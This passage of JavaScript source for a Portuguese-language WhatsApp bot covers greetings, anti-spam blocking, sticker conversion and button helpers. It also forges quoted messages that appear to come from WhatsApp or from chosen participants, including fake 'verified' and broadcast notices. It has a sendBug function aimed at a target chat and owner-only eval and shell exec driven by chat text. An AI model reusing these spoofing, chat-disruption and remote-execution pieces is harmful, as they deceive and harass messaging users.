		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const pperfil = await getBuffer(pporang)
		const sekarang = new Date().getTime();
		
            var ase = new Date();
                        var educabot = ase.getHours();
                        switch(educabot){
                case 0: educabot = `boa noite ${pushname} 🌛`; break;
                case 1: educabot = `boa noite ${pushname} 💤`; break;
                case 2: educabot = `boa noite ${pushname} 🦉`; break;
                case 3: educabot = `bom dia ${pushname} ✨`; break;
                case 4: educabot = `bom dia ${pushname} 💫`; break;
                case 5: educabot = `bom dia ${pushname} 🌅`; break;
                case 6: educabot = `bom dia ${pushname} 🌄`; break;
                case 7: educabot = `bom dia ${pushname} 🌅`; break;
                case 8: educabot = `bom dia ${pushname} 💫`; break;
                case 9: educabot = `bom dia ${pushname} ✨`; break;
                case 10: educabot = `bom dia ${pushname} 🌞`; break;
                case 11: educabot = `bom dia ${pushname} 🌨`; break;
                case 12: educabot = `boa tarde ${pushname} 🌹`; break;
                case 13: educabot = `boa tarde ${pushname} 🌇`; break;
                case 14: educabot = `boa tarde ${pushname} 🌇`; break;
                case 15: educabot = `boa tarde ${pushname} 🥀`; break;
                case 16: educabot = `boa tarde ${pushname} 🌹`; break;
                case 17: educabot = `boa tarde ${pushname} 🌆`; break;
                case 18: educabot = `boa noite ${pushname} 🌛`; break;
                case 19: educabot = `boa noite ${pushname} 🌃`; break;
                case 20: educabot = `boa noite ${pushname} 🌌`; break;
                case 21: educabot = `boa noite ${pushname} 🌃`; break;
                case 22: educabot = `boa noite ${pushname} 🌛`; break;
                case 23: educabot = `boa noite ${pushname} 🌃`; break;
            }
            var noitedia = "" + educabot;
            const jmn = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
    

//..................            
				let d = new Date
				let locale = 'pt'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
		       //ANTI SPAM
        function isMsgLimit(id){
                    if(!isOwner && !mek.key.fromMe) {return false;}
                    let found = false;
                    for (let i of msgLimit){
                        if(i.id === id){
                            if (i.msg >= 8) {
                                found === true 
                                edward.reply(from, `*「 🔥 ANTI TRAVA PV 🔥 」*\nDesculpe mas você será bloqueado por causa do spam de msgs!`, id)
                                edward.contactBlock(id)
                                banned.push(id)
                                fs.writeFileSync('./db/usuário_db/banned.json', JSON.stringify(banned))
                                return true;
                            }else if(i.msg >= 8){
                                found === true
                                edward.reply(from, `*「 🔥 ANTI TRAVA PV 🔥 」*\nVocê foi detectado tentando da spam! Por favor, não envie mais de 5 mensagens de spam ou seu número será bloqueado automaticamente!`, id)
                                return true
                            }else{
                                found === true
                                return false;
                            }   
                        }
                    }
                    if (found === false){
                        let obj = {id: `${id}`, msg:1};
                        msgLimit.push(obj);
                        fs.writeFileSync('./db/outros_db/msgLimit.json',JSON.stringify(msgLimit));
                        return false;
                    }  
                }
                
                        function addMsgLimit(id){
                    if (!isOwner && !mek.key.fromMe) {return;}
                    var found = false
                    Object.keys(msgLimit).forEach((i) => {
                        if(msgLimit[i].id == id){
                            found = i
                        }
                    })
                    if (found !== false) {
                        msgLimit[found].msg += 1;
                        fs.writeFileSync('./db/outros_db/msgLimit.json',JSON.stringify(msgLimit));
                    }
                }
		       
 // RESPOSTA FALSA BY Bruno
// PRODUCT
const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": img //A imagem
					},
					"title": `${noitedia}`, //Nome
					"description": `${noitedia}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${noitedia}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
// TROLI
const say1 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${noitedia}`, //Nome
                            orderTitle: `${noitedia}`,
                            thumbnail: img, //A imagem
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
// LOCATION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${noitedia}`,
                    jpegThumbnail: img
                          }
                        }
                      }
// DOCUMENT
const fdoc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: `${noitedia}`, 
                    jpegThumbnail: img
                          }
                        }
                      }
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${noitedia}`,
                 "h": `${noitedia}`,
                 'duration': '99999', 
                 'caption': `${noitedia}`,
                 'jpegThumbnail': img
                        }
                       }
	                  }
// GROUPINVITE
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${noitedia}`,
			"groupName": `${noitedia}`, 
            "caption": `${noitedia}`, 
            'jpegThumbnail': img
		}
	}
}
// STICKER
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
		"pngThumbnail": img,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// GIF
const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${noitedia}`,
                 "h": `${noitedia}`,
                 'duration': '99999', 
                 'gifPlayback': 'true', 
                 'caption': `${noitedia}`,
                 'jpegThumbnail': img
                        }
                       }
	                  } 
// TEXTO COM THUMBNAIL
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${noitedia}`,
                 "title": `${noitedia}`,
                 'jpegThumbnail': img
                        }
	                  } 
                     }
//WHATSAPP
const tescuk = ["0@s.whatsapp.net"]
const cdd = `AKAME`
// AÚDIO
const fvoc = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "99999",
                 "ptt": "true"
                        }
	                  } 
                     }
/// VIEW ONCE IMG
        const fonceimg = {
key: {
fromMe: false,
  participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "status@broadcast" } : {}) },
  message: {
imageMessage: {
  viewOnce: true
},
},
    };
/// VIEW ONCE VID
const foncevid = { 
key: {fromMe: false, participant: '0@s.whatsapp.net'}, 
message: { 
  videoMessage: { 
  viewOnce: true
},
},
    };
/// TM FAKE
const tm = { 
key: {fromMe: false, participant: '0@s.whatsapp.net'}, 
message: { 
"extendedTextMessage": {
"text": `TRANSMISSÃO`,
"title": `TM`,
'jpegThumbnail': img
},
},
};    
/// Verificado
const say = { 
key: {fromMe: false, participant: '0@s.whatsapp.net'}, 
message: { 
"extendedTextMessage": {
"text": `${NomeBot}`,
"title": `TM`,
'jpegThumbnail': verificado
},
},
};    
const sendBug = async (target) => {
      await edward.relayWAMessage(
        edward.prepareMessageFromContent(
          target,
          edward.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
edward.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await edward.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
edward.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await edward.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
edward.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, loc1, but = [], options = {}) => {
kma = loc1
mhan = await edward.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
edward.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
        const sendButloc = async(id, text1, desc1, gam1, but = [], options = {}) => {
               let kma = gam1
               edward.sendMessage(id, {"contentText": text1,
               "footerText": desc1, 
               "buttons": but,
               "headerType": "LOCATION",
                       "locationMessage": {
                   "text": "olá",
                   "name": "South Brisbane",
                   "address": "Cloudflare, Inc",
                   "jpegThumbnail": kma
                }}, MessageType.buttonsMessage, {quoted: mek, contextInfo:  { externalAdReply:{title: `Criador`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./arquivos/img/verificado.jpg'),sourceUrl:`https://https://api.whatsapp.com/send/?phone=5555933005901&text=oie&app_absent=0?text=Oi?`, options}}})
              }             
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await edward.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
edward.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), "gold"), color('Baixando a figurinha'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./funções/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./figurinha_exif/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					edward.sendMessage(to, media, sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), "gold"), color('Sucesso ao enviar a figurinha'))
					});
					});
				});
			}
        const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './db/cachê/figurinhas' + names + '.png', async function () {
                    console.log('pronto');
                    let ajg = './db/cachê/figurinhas' + names + '.png'
                    let palak = './db/cachê/figurinhas' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        edward.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
            const sendKontak = (from, nomor, nama) => {
	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Criador ${NomeBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        edward.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
            }
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Contato\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await edward.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        edward.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
//LIMIT FOI USADO
for (let lmtr of _limit) {
if (lmtr.id === sender) {
let limitsr = limitawal - lmtr.limit
limitusado = `🎟️ 1 limit foi usado\nSeu limit: ${limitsr} 🎫`}}

            /********** ENVIAR MARCAÇÃO INVISIVEL **********/
const replyinvisiveltag = async function(from, text){
let anu = await edward.groupMetadata(from)
let members = anu.participants
let ane = []
for (let i of members){
ane.push(i.jid)
}
edward.sendMessage(from, text, 'extendedTextMessage', {quoted: mek, contextInfo: {"mentionedJid": ane}})
}
		const reply = (teks) => {
			edward.sendMessage(from, teks, text,  { quoted: m, thumbnail: verificado, contextInfo: { externalAdReply:{title: `${educabot}` ,body:"Obrigado por me usar :)",previewType:"PHOTO",thumbnail:fs.readFileSync('./arquivos/img/verificado.jpg'),sourceUrl:`https://api.whatsapp.com/send/?phone=5555933005901&text=oie&app_absent=0`}}})
		}
		
		const reply2 = (teks) => {
			edward.sendMessage(from, teks, text,  { quoted: mek})
		}
		
const costum = (pesan, tipe, target, target2) => {
 edward.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
}		
		const simir = (teks) => {
			edward.sendMessage(from, teks, text, { quoted:say1 })
		}
		const math = (teks) => {
				return Math.floor(teks)
		}
		const sendMess = (hehe, teks) => {
			edward.sendMessage(hehe, teks, text, { quoted: say1, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		const mentions = (teks, memberr, id) => {
			(id == null || id == undefined || id == false) ? edward.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : edward.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
		}
const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
edward.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
edward.sendMessage(from, hasil, type, options).catch(e => {
edward.sendMessage(from, { url : link }, type, options).catch(e => {
reply
console.log(e)
})
})
})
})
}
// AFK
	if (isGroup) {
		if (!mek.key.fromMe && mek.key.fromMe) return
		for (let x of mentionUser) {
		    if (afk.checkAfkUser(x, _afk)) {
			const getId = afk.getAfkId(x, _afk)
			const getReason = afk.getAfkReason(getId, _afk)
			const getTime = afk.getAfkTime(getId, _afk)
			const cptl = `*「 MODO AFK 」*\n
*Xiiiu! Está pessoa está afk, não a pertube!*
➸ *Rasão*  : ${getReason}
➸ *Desde* : ${getTime}`
      mentions(cptl, x, true)
    }}
		if (afk.checkAfkUser(sender, _afk) && !isCmd) {
		    const getTime = afk.getAfkTime(sender, _afk)
		    const getReason = afk.getAfkReason(sender, _afk)
		    const ittung = ms(await Date.now() - getTime)
		    const pep = `*${pushname}* voltou do AFK!  Bem vindo de volta~`
		    reply(pep)
		    _afk.splice(afk.getAfkPosition(sender, _afk), 1)
		    fs.writeFileSync('./db/usuário_db/afk.json', JSON.stringify(_afk))
		}
	    }
  const sendMediaURL = async(to, url, text="", mids=[]) =>{
  console.log(color(time, 'magenta'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), "gold"), color('Enviando arquivo do link...'))
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					edward.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
		   const sendFakeThumb = async function(from, url, title, desc){
				var anoim = {
					detectLinks: false
				}
				var qul = await edward.generateLinkPreview(url)
				qul.title = title
				qul.description = desc
				qul.jpegThumbnail = img
				edward.sendMessage(from, qul, MessageType.extendedText, anoim)
			}
			function Json(objectPromise) {
var objectString = JSON.stringify(objectPromise, null, 2)
var parse = util.format(objectString)
if (objectString == undefined) {
parse = util.format(objectPromise)
}
return reply(parse)
}
//***********************
            function speedText(speed) {
                let bits = speed * 8;
                const units = ['', 'K', 'M', 'G', 'T'];
                const places = [0, 1, 2, 3];
                let unit = 0;
                while (bits >= 2000 && unit < 4) {
                    unit++;
                    bits/= 1000;
                }
                return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
            } 
 if (budy.startsWith('>')){
		if(!isOwner && !mek.key.fromMe) return
	console.log('[', color('EVAL', 'silver'),']', color(moment(mek.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))
try {
return reply(JSON.stringify(eval(budy.slice(2)),null,'\t'))
} catch(e) {
reply(`${e}`)
}
}
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return reply('somente meu criador')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
  reply(String(e))
}
}
if (body.startsWith('$')) {
if (!c && !isOwner && !mek.key.fromMe) return reply('somente meu criador')
exec(c, (err, stdout) => {
if(err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
			// AUTO
			for (let anji of setik){
				if (budy === anji){
					result = fs.readFileSync(`./arquivos/arquivos_mídia/sticker/${anji}.webp`)
					edward.sendMessage(from, result, sticker, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
					}
			}
			for (let anju of vien){
				if (budy === anju){
					result = fs.readFileSync(`./arquivos/arquivos_mídia/vn/${anju}.mp3`)
					edward.sendMessage(from, result, audio, { mimetype: 'audio/mp4', duration: 359996400, ptt: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (let anjh of imagi){
				if (budy === anjh){
					result = fs.readFileSync(`./arquivos/arquivos_mídia/image/${anjh}.jpg`)
					edward.sendMessage(from, result, image, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
			}
			for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(commandsDB[i].balasan)
				}
			}
			// MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./db/grupo_db/mute.json', JSON.stringify(mute))
                reply('O Grupo foi desmutado com sucesso')
            }
        }
   
			 if (budy.startsWith("https://youtu.be/")) {
   	if (!mek.key.fromMe){
				if (!isGroup) return
    if (autoplay)        
							yta(budy)
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *YTmp3*\n\n❏ *Titúlo* : ${title}\n❏ *Ext* : MP3\n*Tamanho* : ${filesizeF}\n*Link* : ${a.data}\n\n_Desculpe, a duração excede o limite máximo, por favor clique no link acima_`)
						sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, thumbnail: img, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: title,body:"AUTO PLAY",previewType:"PHOTO",thumbnail:thumb,sourceUrl:dl_link}}}).catch(() => reply(mess.error.api))
						})
						})
						}}
	if ( !isGroup && autorespon) {
simi = await fetchJson(`https://api.simsimi.net/v2/?text=${budy}&lc=pt`)
sami = simi.success
edward.sendMessage(from, `_${sami}_`, text, {thumbnail: pperfil, sendEphemeral: true, quoted:mek, contextInfo : {forwardingScore: 508, isForwarded: true}})
 }
if (autoread) {
edward.chatRead(from)
}
if (autocomposing) {
edward.updatePresence(from, Presence.composing)
}
if (autorecording) {
edward.updatePresence(from, Presence.recording)
}

if(isButton == 'igm'){
reply('http://instagram.com/B_r_u_n_o76')

}

if(isButton == 'ctt'){
  const vcard = 'BEGIN:VCARD\n'  

            + 'VERSION:3.0\n'  

            + `FN: Bruno\n`  
            + `ORG: ${NomeBot};\n` 
            + `TEL;type=CELL;type=VOICE;waid=5555933005901:+5555933005901\n`  
            + 'END:VCARD'  
  edward.sendMessage(from, {displayname: "Bruno", vcard: vcard}, MessageType.contact, { quoted: mek})

}
if(isButton == 'gpofc'){
edward.sendMessage(from, `Ficarei feliz em receber você em meu grupo 🤠`, text,{ quoted: m, thumbnail: verificado, contextInfo: { externalAdReply:{title: `${educabot}` ,body:"Obrigado por me usar :)",previewType:"PHOTO",thumbnail:fs.readFileSync('./arquivos/img/verificado.jpg'),sourceUrl:`https://chat.whatsapp.com/D83tJcsjAhv925WJkEHLwW`}}})

}
   const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]

        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
	    const isStcVideo = isStcMedia && content.includes("videoMessage")
	    const isStcImage = isStcMedia && content.includes("imageMessage")
	    const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
        const isViewOnce = (type == 'viewOnceMessage')
       
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
	    if (isCmd && !isGroup) {console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
	    if (!command) {console.log(color('|MSG|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'orange'), color(`${sender}`, 'deeppink'))}
if (!isGroup && isCmd && isBanned) {
return console.log(chalk.keyword("red")("Comando Ignorado"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname))
}
if (isGroup && isCmd && isBanned) {
return console.log(chalk.keyword("red")("Comando Ignorado"), (typeMessage), chalk.greenBright("de"), chalk.keyword("yellow")(pushname), chalk.greenBright("no grupo"), chalk.keyword("yellow")(groupName))
}
if (isCmd) {
_cmds.push(command)
fs.writeFileSync('./db/cachê/cachê/comandos_usados.json', JSON.stringify(_cmds))
}
/*if (budy) {
var perfil = await edward.getProfilePicture(sender)
var bio = await edward.getStatus(sender, MessageType.text)
const infokk = {
perfil: perfil,
nome: pushname,
número: sender,
grupo_pv: from,
bio: bio.status,
msg : budy,
hora: time
}
_usuario.push(infokk)
fs.writeFileSync('./db/cachê/cachê/comandos_usados.json', JSON.stringify(_usuario))
}*/
if ( !isGroup && antipv && isCmd && !isOwner && !mek.key.fromMe) { return reply(`olá ${pushname} o antipv está ativado, fale com meu criador para saber mais...\n\nhttps://api.whatsapp.com/send/?phone=5555933005901&text=oie&app_absent=0\nOu entre no meu grupo:\n\nhttps://chat.whatsapp.com/D83tJcsjAhv925WJkEHLwW`)
}
const isFigurinha = (type === 'stickerMessage')
if (isAutofigu) {
if (isMedia && !mek.message.videoMessage || isQuotedImage && isFigurinha) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await edward.downloadAndSaveMediaMessage(encmedia)                                     
rano = getRandom('.webp')
await ffmpeg(`./temp/${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ./figurinha_exif/data.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
fs.unlinkSync(media)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
edward.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(rano)
})
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await edward.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
await ffmpeg(`./temp/${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ./figurinha_exif/data.exif ./figurinha_exif/${sender}.webp -o ./figurinha_exif/${sender}.webp`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na conversão de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
edward.sendMessage(from, buffer, sticker, {quoted: mek})
fs.unlinkSync(rano)
})
} else {
}
}
        switch (isStc) {
     case "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf":
        if (!isStcSticker) return reply('Marque a figurinha!')
        su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
        reply(su)
				}

	                        //function check 
	                        /*
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return edward.sendMessage(from,`[👾] *LIMIT ESGOTADO*\n\n_Nota : para obter mais limit compre usando *${prefix}compralimit* ou suba de nível...`, text,{sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek})
                            limitxt = `*「 🧮SEU LIMIT🧮 」*
*seu limite restante : ${limitCounts}*`
                            edward.sendMessage(from, limitxt, text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
